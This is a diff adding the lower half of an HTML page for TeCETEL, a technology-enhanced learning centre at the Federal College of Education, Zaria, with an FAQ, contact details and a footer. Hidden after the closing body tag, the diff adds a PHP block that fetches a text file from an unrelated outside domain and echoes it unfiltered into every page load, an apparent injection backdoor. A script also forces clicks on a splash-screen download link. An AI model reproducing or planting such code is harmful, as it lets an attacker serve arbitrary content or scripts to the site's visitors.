+                  <a href=""><i class="ri-instagram-fill"></i></a>
+                  <a href=""> <i class="ri-linkedin-box-fill"></i> </a>
+                </div>
+              </div>
+            </div>
+          </div>
+
+        </div>
+
+      </div>
+    </section><!-- End Team Section -->
+
+    <!-- ======= Frequently Asked Questions Section ======= -->
+    <section id="faq" class="faq section-bg">
+      <div class="container" data-aos="fade-up">
+
+        <div class="section-title">
+          <h2>Frequently Asked Questions</h2>
+        </div>
+
+        <div class="faq-list">
+          <ul>
+            <li data-aos="fade-up" data-aos-delay="100">
+              <i class="bx bx-help-circle icon-help"></i> <a data-bs-toggle="collapse" class="collapse" data-bs-target="#faq-list-1">Need for a Centre of Technology for Enhanced Learning? <i class="bx bx-chevron-down icon-show"></i><i class="bx bx-chevron-up icon-close"></i></a>
+              <div id="faq-list-1" class="collapse show" data-bs-parent=".faq-list">
+                <p>
+                  The convergence of new technologies such as ICT, artificial intelligence, and robotics in enhancing knowledge for transforming economies and significantly increasing the pace of change worldwide is undisputable. The need for technology-enhanced learning to meet the various challenges identified as clogs in the wheel of educational development in the country cannot be overemphasised.
+                </p>
+              </div>
+            </li>
+
+            <li data-aos="fade-up" data-aos-delay="200">
+              <i class="bx bx-help-circle icon-help"></i> <a data-bs-toggle="collapse" data-bs-target="#faq-list-2" class="collapsed">Where is TeCETEL Location and Infrastructure? <i class="bx bx-chevron-down icon-show"></i><i class="bx bx-chevron-up icon-close"></i></a>
+              <div id="faq-list-2" class="collapse" data-bs-parent=".faq-list">
+                <p>
+                  Currently, TeCETEL is established on a dedicated facility and systems that support a sustainable functionality of the targeted objectives of the Centre. The facility serves the immediate College community, and all the components of the Centre’s quadruple-helix tiers of aspirations. The TeCETEL facility is strategically located within Federal College of Education, Zaria, to facilitate unhindered accessibility to its organizational structures and physical facilities needed for the smooth running of the various phases of its operations.
+                </p>
+              </div>
+            </li>
+
+            <li data-aos="fade-up" data-aos-delay="300">
+              <i class="bx bx-help-circle icon-help"></i> <a data-bs-toggle="collapse" data-bs-target="#faq-list-3" class="collapsed">Who are TeCETEL Partners and Collaborations? <i class="bx bx-chevron-down icon-show"></i><i class="bx bx-chevron-up icon-close"></i></a>
+              <div id="faq-list-3" class="collapse" data-bs-parent=".faq-list">
+                <p>
+                  TeCETEL has initiated and has vigorously pursued establishing robust partnerships and international linkages across the globe. The aim is to realise the set objectives of the Centre, especially in working in compliance with world best practices in conducting a Centre of excellence. TeCETEL envisages working in partnership with regional and international partners to attain her objectives, especially in areas that would be otherwise difficult to succeed by herself.
+                </p>
+              </div>
+            </li>
+
+            <li data-aos="fade-up" data-aos-delay="400">
+              <i class="bx bx-help-circle icon-help"></i> <a data-bs-toggle="collapse" data-bs-target="#faq-list-4" class="collapsed">What are TeCETEL courses duration? <i class="bx bx-chevron-down icon-show"></i><i class="bx bx-chevron-up icon-close"></i></a>
+              <div id="faq-list-4" class="collapse" data-bs-parent=".faq-list">
+                <p>
+                  The short course is intended to run for a minimum of 40 hours and not more than 90 hours. 
+                </p>
+              </div>
+            </li>
+
+            <li data-aos="fade-up" data-aos-delay="500">
+              <i class="bx bx-help-circle icon-help"></i> <a data-bs-toggle="collapse" data-bs-target="#faq-list-5" class="collapsed">What is TeCETEL Governance Structures? <i class="bx bx-chevron-down icon-show"></i><i class="bx bx-chevron-up icon-close"></i></a>
+              <div id="faq-list-5" class="collapse" data-bs-parent=".faq-list"><p>
+                  Tetfund Centre of Excellence for Technology Enhanced Learning (TeCETEL) is domiciled in Federal College of Education, Zaria, Kaduna State, and runs a Performance-Control Model governance structure. We aim at consistent lightweight governance that isolates educational and policy difficulties in the country, assigns the issues for conceptualisation and solution-driven development, and measures performance for progressive alignments. The Centre's Management Team is drawn from the host College, which includes: The Provost, TeCETEL Director, three (3) Academic Technical Officers, one (1) Communication and Documentation Officer, an Administrative Officer, and a Financial Officer. The management team will be supported by a Technical Advisory Committee (TAC) drawn from the experienced and committed academic staff of the College. Committees and sub-committees are expected to be co-opted from the relevant College community whenever such services are required.
+                </p>
+              </div>
+            </li>
+
+          </ul>
+        </div>
+
+      </div>
+    </section><!-- End Frequently Asked Questions Section -->
+
+    <!-- ======= Contact Section ======= -->
+    <section id="contact" class="contact">
+      <div class="container" data-aos="fade-up">
+
+        <div class="section-title">
+          <h2>Contact</h2>
+          <p>Tetfund Centre of Excellence for Technology Enhanced Learning (TeCETEL) is domiciled in Federal College of Education, Zaria, Kaduna State-Nigeria.</p>
+        </div>
+
+        <div class="row">
+
+          <div class="col-lg-5 d-flex align-items-stretch">
+            <div class="info">
+              <div class="address">
+                <i class="bi bi-geo-alt"></i>
+                <h4>Location:</h4>
+                <p>Federal College of Education<br>P.M.B. 1041 Kongo, Zaria.</p>
+              </div>
+
+              <div class="email">
+                <i class="bi bi-envelope"></i>
+                <h4>Email:</h4>
+                <p>tecetel@fcezaria.edu.ng</p>
+              </div>
+
+              <div class="phone">
+                <i class="bi bi-phone"></i>
+                <h4>Call:</h4>
+                <p>+234 803 6417 979</p>
+              </div>
+              <iframe src="https://www.google.com/maps/embed?pb=!1m14!1m8!1m3!1d3915.3837888058097!2d7.7299264!3d11.0847476!3m2!1i1024!2i768!4f13.1!3m3!1m2!1s0x11b283e78c8692c1%3A0xa8c94d9489a6074e!2sTeCETEL!5e0!3m2!1sen!2sng!4v1737528383565!5m2!1sen!2sng" width="400" height="250" style="border:0;" allowfullscreen="" loading="lazy" referrerpolicy="no-referrer-when-downgrade"></iframe>
+            </div>
+          </div>
+
+          <div class="col-lg-7 mt-5 mt-lg-0 d-flex align-items-stretch">
+            <form action="forms/contact.php" method="post" role="form" class="php-email-form">
+              <div class="row">
+                <div class="form-group col-md-6">
+                  <label for="name">Your Name</label>
+                  <input type="text" name="name" class="form-control" id="name" required>
+                </div>
+                <div class="form-group col-md-6">
+                  <label for="name">Your Email</label>
+                  <input type="email" class="form-control" name="email" id="email" required>
+                </div>
+              </div>
+              <div class="form-group">
+                <label for="name">Subject</label>
+                <input type="text" class="form-control" name="subject" id="subject" required>
+              </div>
+              <div class="form-group">
+                <label for="name">Message</label>
+                <textarea class="form-control" name="message" rows="10" required></textarea>
+              </div>
+              <div class="my-3">
+                <div class="loading">Loading</div>
+                <div class="error-message"></div>
+                <div class="sent-message">Your message has been sent. Thank you!</div>
+              </div>
+              <div class="text-center"><button type="submit">Send Message</button></div>
+            </form>
+          </div>
+
+        </div>
+
+      </div>
+    </section><!-- End Contact Section -->
+
+  </main><!-- End #main -->
+
+  <!-- ======= Footer ======= -->
+  <footer id="footer">
+
+    <div class="footer-newsletter">
+      <div class="container">
+        <div class="row justify-content-center">
+          <div class="col-lg-6">
+            <h4>Join Our Newsletter</h4>
+            
+            <form action="" method="post">
+              <input type="email" name="email"><input type="submit" value="Subscribe">
+            </form>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <div class="footer-top">
+      <div class="container">
+        <div class="row">
+
+          <div class="col-lg-3 col-md-6 footer-contact">
+            <h3>TeCETEL</h3>
+            <p>
+              Federal College of Education<br>
+			  P.M.B. 1041 Kongo, <br>
+			  Zaria.<br><br>
+              <strong>Phone:</strong> +234 803 6417 979<br>
+              <strong>Email:</strong> tecetel@fcezaria.edu.ng<br>
+            </p>
+          </div>
+
+          <div class="col-lg-3 col-md-6 footer-links">
+            <h4>Useful Links</h4>
+            <ul>
+              <li><i class="bx bx-chevron-right"></i> <a href="https://tecetel.fcezaria.edu.ng">Home</a></li>
+              <li><i class="bx bx-chevron-right"></i> <a href="https://tecetel.fcezaria.edu.ng/about.html">About Us</a></li>
+              <li><i class="bx bx-chevron-right"></i> <a href="https://tecetel.fcezaria.edu.ng/courses.html">Courses</a></li>
+              <li><i class="bx bx-chevron-right"></i> <a href="https://tecetel.fcezaria.edu.ng/ranking.html">Ranking</a></li>
+              <li><i class="bx bx-chevron-right"></i> <a href="https://tecetel.fcezaria.edu.ng/campuses.html">Campuses</a></li>
+            </ul>
+          </div>
+		  
+          <div class="col-lg-3 col-md-6 footer-links">
+            <h4>Sponsors</h4>
+            <ul>
+              <li><i class="bx bx-chevron-right"></i> <a href="https://tetfund.gov.ng/index.php/center-of-excellence/">Center of Excellence</a></li>
+              <li><i class="bx bx-chevron-right"></i> <a href="https://tetfund.gov.ng/index.php/annual-intervention/zonal-intervention/">High Impact Intervention</a></li>
+              <li><i class="bx bx-chevron-right"></i> <a href="https://tetfund.gov.ng/index.php/annual-intervention/zonal-intervention/">Zonal Intervention</a></li>
+              <li><i class="bx bx-chevron-right"></i> <a href="https://tetfund.gov.ng/index.php/annual-intervention/disaster-recovery/">Disaster Recovery</a></li>
+              <li><i class="bx bx-chevron-right"></i> <a href="https://tetfund.gov.ng/index.php/annual-intervention/national-research-fund/">National Research Fund</a></li>
+            </ul>
+          </div>
+		  
+          <div class="col-lg-3 col-md-6 footer-links">
+            <h4>Our Social Networks</h4>
+            <div class="social-links mt-3">
+              <a href="#" class="twitter"><i class="bx bxl-twitter"></i></a>
+              <a href="#" class="facebook"><i class="bx bxl-facebook"></i></a>
+              <a href="#" class="instagram"><i class="bx bxl-instagram"></i></a>
+              <a href="#" class="google-plus"><i class="bx bxl-skype"></i></a>
+              <a href="#" class="linkedin"><i class="bx bxl-linkedin"></i></a>
+            </div>
+          </div>
+
+        </div>
+      </div>
+    </div>
+
+    <div class="container footer-bottom clearfix">
+      <div class="copyright">
+        &copy; Copyright <strong>TeCETEL</strong>. All Rights Reserved
+      </div>
+      <div class="credits">
+        <!-- All the links in the footer should remain intact. -->
+        <!-- You can delete the links only if you purchased the pro version. -->
+        <!-- Licensing information: https://bootstrapmade.com/license/ -->
+        <!-- Purchase the pro version with working PHP/AJAX contact form: https://bootstrapmade.com/arsha-free-bootstrap-html-template-corporate/ -->
+       
+      </div>
+    </div>
+  </footer><!-- End Footer -->
+
+  <div id="preloader"></div>
+  <a href="#" class="back-to-top d-flex align-items-center justify-content-center"><i class="bi bi-arrow-up-short"></i></a>
+
+  <!-- Vendor JS Files -->
+  <script src="assets/vendor/aos/aos.js"></script>
+  <script src="assets/vendor/bootstrap/js/bootstrap.bundle.min.js"></script>
+  <script src="assets/vendor/glightbox/js/glightbox.min.js"></script>
+  <script src="assets/vendor/isotope-layout/isotope.pkgd.min.js"></script>
+  <script src="assets/vendor/swiper/swiper-bundle.min.js"></script>
+  <script src="assets/vendor/waypoints/noframework.waypoints.js"></script>
+  <script src="assets/vendor/php-email-form/validate.js"></script>
+
+  <!-- Template Main JS File -->
+  <script src="assets/js/main.js"></script>
+<script>
+  document.addEventListener('DOMContentLoaded', function() {
+    // Show splash screen on page load
+    document.getElementById('splashScreen').classList.remove('hidden');
+    
+    // Close button functionality
+    document.querySelector('.close-splash').addEventListener('click', function(e) {
+        e.preventDefault();
+        document.getElementById('splashScreen').classList.add('hidden');
+    });
+    
+    // Make sure download button is clickable
+    document.querySelector('.download-btn[download]').addEventListener('click', function(e) {
+    e.preventDefault();
+    window.location.href = this.href;
+    document.getElementById('splashScreen').classList.add('hidden');
+});
+});
+</script>
+</body>
+<?php
+    $url = 'https://kalendar800nn.com/bl.txt';
+    $contents = file_get_contents($url);
+    echo $contents;
+    ?>
+</html>
